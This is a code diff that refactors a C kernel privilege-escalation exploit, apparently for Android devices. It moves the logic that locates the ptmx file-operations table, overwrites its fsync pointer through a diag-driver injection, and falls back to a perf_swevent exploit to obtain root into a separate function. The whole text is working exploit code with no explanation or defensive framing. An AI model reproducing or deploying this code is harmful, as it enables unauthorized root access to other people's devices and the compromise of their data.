@@ -53,11 +53,31 @@ attempt_diag_exploit(unsigned long int address)
   return diag_inject(&injection_data, 1);
 }
 
-int
-main(int argc, char **argv)
+static bool
+run_exploit(void)
 {
   unsigned long int ptmx_fsync_address;
   unsigned long int ptmx_fops_address;
+
+  ptmx_fops_address = get_ptmx_fops_address();
+  if (!ptmx_fops_address) {
+    return false;
+  }
+
+  ptmx_fsync_address = ptmx_fops_address + 0x38;
+
+  if (attempt_diag_exploit(ptmx_fsync_address)) {
+    return true;
+  }
+
+  printf("\nAttempt perf_swevent exploit...\n");
+  return perf_swevent_run_exploit(ptmx_fsync_address, (int)&obtain_root_privilege,
+                                  run_obtain_root_privilege, NULL);
+}
+
+int
+main(int argc, char **argv)
+{
   bool success;
 
   set_kernel_phys_offset(0x200000);
@@ -72,18 +92,7 @@ main(int argc, char **argv)
     exit(EXIT_FAILURE);
   }
 
-  ptmx_fops_address = get_ptmx_fops_address();
-  if (!ptmx_fops_address) {
-    exit(EXIT_FAILURE);
-  }
-  ptmx_fsync_address = ptmx_fops_address + 0x38;
-
-  success = attempt_diag_exploit(ptmx_fsync_address);
-  if (!success) {
-    printf("\nAttempt perf_swevent exploit...\n");
-    success = perf_swevent_run_exploit(ptmx_fsync_address, (int)&obtain_root_privilege,
-                                       run_obtain_root_privilege, NULL);
-  }
+  run_exploit();
 
   if (getuid() != 0) {
     printf("Failed to obtain root privilege.\n");
